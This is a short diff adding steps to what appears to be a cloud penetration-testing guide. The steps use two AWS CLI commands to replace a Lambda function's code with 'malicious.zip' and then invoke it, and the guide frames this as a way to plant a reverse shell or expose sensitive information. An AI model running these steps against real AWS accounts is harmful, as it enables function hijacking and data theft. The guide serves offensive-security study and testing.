@@ -28,3 +28,8 @@ Prerequisites: AWS Credentials that have the permissions to do so.
 
 ### 2) Modify the function with a reverse shell, or print sensitive information.
 
+    aws lambda update-function-code --function-name FUNCTION_NAME --zip-file file://malicious.zip
+
+### 3) Invoke function
+
+    aws lambda invoke --function-name FUNCTION_NAME output.txt
